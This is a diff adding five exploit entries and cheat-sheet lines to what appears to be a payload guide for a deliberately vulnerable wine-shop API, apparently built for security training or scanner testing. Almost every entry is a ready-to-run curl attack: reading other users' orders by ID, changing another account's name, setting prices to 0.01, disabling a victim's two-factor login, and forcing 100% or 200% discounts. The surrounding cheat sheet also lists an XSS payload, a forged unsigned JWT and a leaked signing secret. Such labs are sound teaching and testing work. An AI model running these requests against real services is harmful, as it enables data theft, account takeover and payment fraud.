@@ -272,6 +272,138 @@ Note:
   misconfiguration that DAST scanners will flag.
 
 
+=== 11. BOLA (IDOR) on Order Details ===
+CWE-639 | High | GET /orders/:id
+
+Payload:
+  # Login as user A
+  TOKEN_A=$(curl -s -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email": "joe@example.com", "password": "password123"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
+
+  # View another user's order (e.g., order #1, #2, #3 ...)
+  curl -H "Authorization: Bearer $TOKEN_A" https://api.taintedport.com/orders/1
+  curl -H "Authorization: Bearer $TOKEN_A" https://api.taintedport.com/orders/2
+  curl -H "Authorization: Bearer $TOKEN_A" https://api.taintedport.com/orders/3
+
+How it works:
+  The GET /orders/:id endpoint only checks that the user is authenticated,
+  NOT that they own the order. Any authenticated user can enumerate all
+  orders by incrementing the ID and view shipping details, items, and totals
+  belonging to other users.
+
+
+=== 12. BOLA / Mass Assignment on Profile Update ===
+CWE-639 | High | PUT /auth/profile
+
+Payload:
+  # Login as attacker
+  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email": "joe@example.com", "password": "password123"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
+
+  # Change user #2's name (not your own account)
+  curl -X PUT https://api.taintedport.com/auth/profile \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"name": "HACKED", "user_id": 2}'
+
+How it works:
+  The profile update endpoint accepts an optional user_id in the request body.
+  If present, it updates THAT user's name instead of the authenticated user's.
+  The server does not verify that the user_id matches the token's user.
+
+
+=== 13. Price Manipulation on Cart ===
+CWE-472 | High | POST /cart/add
+
+Payload:
+  # Login
+  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email": "joe@example.com", "password": "password123"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
+
+  # Add wine #1 to cart with a price of 0.01
+  curl -X POST https://api.taintedport.com/cart/add \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"wine_id": 1, "quantity": 1, "price": 0.01}'
+
+  # Check cart - wine is now priced at 0.01
+  curl -H "Authorization: Bearer $TOKEN" https://api.taintedport.com/cart
+
+How it works:
+  The cart add endpoint accepts an optional price field. If provided, it
+  updates the wine's actual price in the database before adding to cart.
+  The attacker pays 0.01 for a wine that costs hundreds of euros.
+  Note: this also affects the price for ALL users since it modifies the DB.
+
+
+=== 14. Broken Access Control on 2FA Disable ===
+CWE-639 | High | POST /auth/2fa/disable
+
+Payload:
+  # Login as attacker (knows their own password)
+  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email": "joe@example.com", "password": "password123"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
+
+  # Disable 2FA for user #2 (victim) using attacker's own password
+  curl -X POST https://api.taintedport.com/auth/2fa/disable \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"password": "password123", "user_id": 2}'
+
+How it works:
+  The 2FA disable endpoint validates the password against the authenticated
+  user (attacker), but if a user_id parameter is provided, it disables 2FA
+  for THAT user instead. The attacker only needs to know their own password.
+
+
+=== 15. Discount Code Bypass ===
+CWE-472 | High | POST /orders
+
+Payload (100% discount - free order):
+  # Login and add items to cart first (see examples above)
+
+  curl -X POST https://api.taintedport.com/orders \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{
+      "shipping_address": {
+        "name": "Free Wine",
+        "street": "123 Test St",
+        "city": "Lisboa",
+        "postal_code": "1000-001",
+        "phone": "+351999999999"
+      },
+      "discount_code": "ANYTHING",
+      "discount_percent": 100
+    }'
+
+Payload (negative total - store owes you money):
+  curl -X POST https://api.taintedport.com/orders \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{
+      "shipping_address": {
+        "name": "Credit Exploit",
+        "street": "123 Test St",
+        "city": "Lisboa",
+        "postal_code": "1000-001",
+        "phone": "+351999999999"
+      },
+      "discount_code": "GIVEMEMONEY",
+      "discount_percent": 200
+    }'
+
+How it works:
+  The checkout endpoint accepts discount_code and discount_percent fields.
+  Any non-empty string is accepted as a valid discount code. The
+  discount_percent value is applied directly with no cap - 100 means
+  free, >100 means negative total (credit).
+
+
 ============================================================
   CHEAT SHEET - Quick Copy-Paste Payloads
 ============================================================
@@ -285,3 +417,8 @@ XSS stored order:        <img src=x onerror=alert('XSS')>
 JWT none token:          eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OX0.
 Directory listing:       /files/
 JWT secret (from dir):   pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI
+BOLA order:              GET /orders/1 (with any user's token)
+Mass assignment:         {"name": "HACKED", "user_id": 2}
+Price manipulation:      {"wine_id": 1, "quantity": 1, "price": 0.01}
+2FA disable IDOR:        {"password": "yourpass", "user_id": 2}
+Free order:              {"discount_code": "X", "discount_percent": 100}
